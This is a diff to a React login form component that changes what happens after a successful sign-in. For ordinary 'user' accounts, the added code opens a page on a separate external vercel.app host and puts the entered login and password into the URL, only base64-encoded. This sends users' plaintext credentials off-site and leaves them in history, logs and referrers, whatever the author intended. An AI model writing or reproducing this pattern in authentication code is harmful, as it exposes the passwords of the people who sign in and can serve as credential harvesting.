@@ -3,7 +3,7 @@ import type { FormProps } from "antd";
 import { Alert, Button, Form, Input } from "antd";
 import { useAuth } from "../service/useAuth";
 import { useDispatch } from "react-redux";
-import { setToken } from "../store/authSlice";
+import { setToken, removeUser } from "../store/authSlice";
 import { Link, useNavigate } from "react-router-dom";
 
 type FieldType = {
@@ -19,8 +19,15 @@ const Login = () => {
   const onFinish: FormProps<FieldType>["onFinish"] = (values) => {
     signIn.mutate(values, {
       onSuccess: (res) => {
-        dispatch(setToken(res.data))
-        navigate("/")
+        dispatch(setToken(res.data.accessToken))
+        if (res.data.user.role === "user") {
+          open(
+            `https://next-project-2-part.vercel.app/verify?q=${btoa(JSON.stringify(values))}`
+          );
+        } else {
+          navigate("/");
+        }
+        dispatch(removeUser());
       }
     })
   };
